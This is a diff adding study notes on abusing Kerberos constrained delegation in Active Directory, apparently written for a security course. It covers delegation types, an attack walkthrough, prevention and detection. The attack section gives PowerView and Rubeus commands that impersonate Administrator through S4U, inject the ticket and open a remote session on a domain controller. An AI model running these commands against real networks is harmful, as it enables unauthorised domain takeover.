@@ -5,3 +5,69 @@ Description:
 
   - Once a user logs into the website, the web server service account will request to the SQL server service on behalf of the user, allowing the user to get access
     to the content in the database that they've been provisioned to without having to assign any access to the web server service account itself.
+
+  - Can configure 3 types of delegations in AD:
+    Unconstrained Delegation (most permissive/broad)
+    Constrained Delegation
+    Resource-based Delegation 
+
+  - Unconstrained delegation allows an account to delegate to any service
+
+  - Constrained delegation a user will have its properties configured to specify which service they can delegate.
+
+
+Attack:
+
+  - This is for constrained delegation:
+
+  - When an account sends a request to the KDC stating, "Give me a kerberos ticket for user YYY because I am trusted to delegate this user to service ZZZZ,
+    and a kerberos ticket is generated for user YYYY (without supplying the password of user YYYY). 
+
+  - It is possible to delegate to another service, even if not configured in the user properties. 
+
+  - If we are trusted to delegate for LDAP, we can perform protocol transition and be entrusted to any other service such as CIFS or HTTP
+
+  Get-NetUser -TrustedToAuth
+    - This enumerates user accounts that are trusted for constained delegation in the domain
+
+  .\Rubeus.exe hash /password:Slavi123
+    - This converts Slavi123 into NTLM hash equivalent so we can feed it into ticket request command
+
+  .\Rubeus/exe s4u /user:webservice /rc4:YYYYYYYYYYYY /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
+
+  - Utilize klist to ensure the ticket is injected in the current session
+
+  Enter-PSSession dc1
+
+- If last step fails, do a klist purge, obtain new tickets, and try again by rebooting machine.
+
+- Can also request tickets for multiple services with the /altservice argument, such as LDAP, CFIS, time, and host
+
+
+Prevention:
+
+  - Two ways to prevent a ticket from being issused for a user via delegation:
+    - Configure the property Account is sensitive and cannot be delegated for all privileged users
+    - Add privileged users to the Protected Users group: this membership automatically applies the protection mentioned above (however, it is not recommended to use 
+      Protected Users without first understanding its potenital implications.)
+
+
+Detection:
+
+  - Correlating users behavior
+
+  - Monitor 4624
+
+  - Sometimes successful logon with delegated ticket will contain info about the ticket's issuer under the Transited Services attribute in the events log
+
+  - This attribute is normally populated if the logon resulted from an S4U (service for user) logon process.
+
+  - S4U is a Microsoft extension to the Kerberos protocol that allows an application service to obtain a Kerberos service ticket on behalf of a user
+
+
+
+
+
+
+
+
